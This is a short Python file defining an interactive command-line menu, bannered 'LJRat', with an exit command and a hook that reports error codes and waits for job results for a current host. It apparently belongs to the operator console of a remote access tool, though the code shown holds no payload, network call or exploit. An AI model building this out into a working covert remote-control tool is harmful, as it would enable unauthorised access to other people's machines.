import cmd
import time
import error
from error import *
from globals import *

class Menu(cmd.Cmd):
    intro = "LJRat"
    prompt = "> "
    current_host = None

    def do_exit(self, arg):
        '''Function to exit the CMD.cmdloop by returning True'''
        return True

    def postcmd(self, results, line):
        ''' Overload function that conducts checks after command is executed'''

        # Ensure something was passed back in from command module
        if None != results:
            msg = results[0]
            error_code = results[1]
            if E_SUCCESS != error_code:
                print(ERROR_TABLE[error_code])
                return None
            # Check to see if command that was executed has results that have already processed
            while msg.job_id not in ctx.processed:
                time.sleep(1)

        return None
